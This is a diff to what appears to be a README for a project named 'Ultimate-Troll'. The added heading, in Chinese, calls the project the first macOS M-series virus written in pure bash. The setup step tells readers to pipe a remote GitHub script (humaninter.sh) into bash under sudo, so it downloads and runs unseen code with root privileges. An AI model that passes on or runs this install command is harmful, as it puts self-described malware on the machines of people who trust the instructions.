@@ -1,3 +1,5 @@
+#史上第一款，MacOS M系列病毒，100%纯bash（需要手动给予权限/nclick exploit）#
+
 首次设置
 ---
 `sudo curl -fsSL https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/humaninter.sh | bash`
